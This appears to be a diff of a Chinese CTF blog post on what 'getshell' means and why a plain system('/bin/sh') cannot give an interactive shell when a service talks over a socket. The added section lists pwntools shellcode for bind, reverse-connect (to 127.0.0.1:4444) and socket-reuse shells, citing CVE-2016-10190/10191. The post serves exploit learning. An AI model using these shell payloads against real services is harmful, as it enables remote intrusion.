@@ -8,7 +8,7 @@
 
 <head>
 
-  <title>getshell是什么？（待完成） | Rin</title>
+  <title>getshell是什么？ | Rin</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -102,7 +102,7 @@
 				    
 				    <li><a href="/categories/KERNEL/" class="animsition-link">KERNEL<small>(2)</small></a></li>
 				    
-				    <li><a href="/categories/MESS/" class="animsition-link">MESS<small>(18)</small></a></li>
+				    <li><a href="/categories/MESS/" class="animsition-link">MESS<small>(19)</small></a></li>
 				    
 				    <li><a href="/categories/Machine-Learning/" class="animsition-link">Machine Learning<small>(3)</small></a></li>
 				    
@@ -240,15 +240,16 @@
       </time>
     
 </span>
-                <h1>getshell是什么？（待完成）</h1>
+                <h1>getshell是什么？</h1>
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
       		<h1><span id="0-前言">0 前言</span></h1><p>​        研究2018-1160的时候，看到一篇文章中的一句话，让我费解到了现在：</p>
+<p><a target="_blank" rel="noopener" href="https://ddaa.tw/hitconctf_pwn_371_netatalk.html">HITCON CTF 2019 Pwn 371 Netatalk</a></p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-24%20%E4%B8%8A%E5%8D%8811.23.38.png" alt="截屏2022-10-24 上午11.23.38"></p>
 <p>非常不幸的是，最近在研究2016-10191的时候也遇到了同样的问题——onegadget无法getshell，以上种种让我对getshell这个看似简单的概念产生了巨大的疑惑，遂有了这一篇文章–getshell到底是什么？</p>
 <h2><span id="问题解答">问题解答？</span></h2><p>​        首先讲我对于“自行dup i/o”的理解，可能有不对的地方。一般情况下，我们利用pwbntools封装的socket接口与远程程序进行交互，我们的io都已经被pwntools重定向到了socket上，所以我们如果希望程序执行<code>system(&quot;/bin/sh&quot;)</code>的话就只需要发送过去就好了。那么当程序执行这条语句的时候，就会生成一个本地的shell，再由pwntools发送过来以完成“交互”。但是如果程序本身就是由socket进行交互的话，我们希望程序执行<code>system(&quot;/bin/sh&quot;)</code>，那么好的情况它也只是会在本地执行<code>sh</code>,而这个弹出的shell并不能进行交互，因为没有渠道供我们与这个“shell”交互。所以解决方式就是利用shellcode或rop链反弹shell。</p>
-<h2><span id="getshell">getshell</span></h2><p>​        首先从简单的ctf pwn开始。</p>
+<h2><span id="ctf-getshell">ctf getshell</span></h2><p>​        首先从简单的ctf pwn开始。</p>
 <p>​        平时我们getshell的思路——控制程序执行流，rip劫持为提权函数。比如说覆盖某个函数指针为<code>system(&quot;/bin/sh&quot;)</code>，一般的流程是这样：本地打通后，连接远程环境，一般情况下也能拿到远程机器的shell。</p>
 <p>​        但是我们究竟是怎么与远端程序进行通信的？</p>
 <p>​        我们通常使用pwntool的<code>tubes</code>模块，比如</p>
@@ -258,20 +259,13 @@
 <p>​        看一看pwntools的官方文档的解释：</p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-24%20%E4%B8%8A%E5%8D%8811.20.27.png" alt="截屏2022-10-24 上午11.20.27"></p>
 <p>创造一个远程主机的TCVP/UDP 链接。熟悉socket编程的话就能很快反应过来，其实就是pwntool为我们创建了一个socket供本机与远程进行连接。</p>
-<p>来看一眼源码（鸽了好久的pwntools源码分析终于要重启了吗）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#&quot;/pwnlib/tubes/remote.py&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_connect</span>(<span class="params">self, fam, typ</span>):</span></span><br><span class="line">        sock    = <span class="literal">None</span></span><br><span class="line">        timeout = self.timeout</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> self.waitfor(<span class="string">&#x27;Opening connection to %s on port %d&#x27;</span> % (self.rhost, self.rport)) <span class="keyword">as</span> h:</span><br><span class="line">            <span class="keyword">for</span> res <span class="keyword">in</span> socket.getaddrinfo(self.rhost, self.rport, fam, typ, <span class="number">0</span>, socket.AI_PASSIVE):</span><br><span class="line">                self.family, self.<span class="built_in">type</span>, self.proto, _canonname, sockaddr = res</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> self.<span class="built_in">type</span> <span class="keyword">not</span> <span class="keyword">in</span> [socket.SOCK_STREAM, socket.SOCK_DGRAM]:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                h.status(<span class="string">&quot;Trying %s&quot;</span>, sockaddr[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">                sock = socket.socket(self.family, self.<span class="built_in">type</span>, self.proto)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> timeout <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> timeout &lt;= <span class="number">0</span>:</span><br><span class="line">                    sock.setblocking(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    sock.setblocking(<span class="number">1</span>)</span><br><span class="line">                    sock.settimeout(timeout)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    sock.connect(sockaddr)</span><br><span class="line">                    <span class="keyword">return</span> sock</span><br><span class="line">                <span class="keyword">except</span> socks.ProxyError:</span><br><span class="line">                    <span class="keyword">raise</span></span><br><span class="line">                <span class="keyword">except</span> socket.error:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">            self.error(<span class="string">&quot;Could not connect to %s on port %d&quot;</span>, self.rhost, self.rport)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><code>process()</code>的功能也可以用同样的方式去理解。</p>
+<h2><span id="实战">实战</span></h2><p>如果程序通信是通过socket，那么我们无法通过简单的<code>one_gadget</code>或者什么弹shell，就需要用到一些方法。这里copy一下轩神的笔记：</p>
+<p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/">Getshell远程：真·RCE 正连？反连？不连？</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">8888</span>)</span><br><span class="line">shellcode1 = asm(shellcraft.sh())<span class="comment">#无交互式shell</span></span><br><span class="line">shellcode2 = asm(shellcraft.amd64.linux.bindsh(<span class="number">4444</span>))<span class="comment">#正连</span></span><br><span class="line">shellcode3 = asm(shellcraft.connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">4444</span>)+shellcraft.dupsh())<span class="comment">#反连</span></span><br><span class="line">shellcode4 = asm(shellcraft.dupsh(<span class="number">4</span>))<span class="comment">#不连</span></span><br><span class="line">shellcode5 = asm(shellcraft.findpeersh(io.lport))<span class="comment">#不连</span></span><br></pre></td></tr></table></figure>
 
+<p>以上几种就是常见的弹shell思路，在cve-2016-10190和10191就是两个很好的例子，他们都是使用socket进行通信，并且都是可以利用反连到<code>&#39;127.0.0.1&#39;</code>+<code>port</code>的shellcode来弹shell。</p>
 
-
-
-
-
-
-
-
-
-
-<h1><span id="参考">参考</span></h1>
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
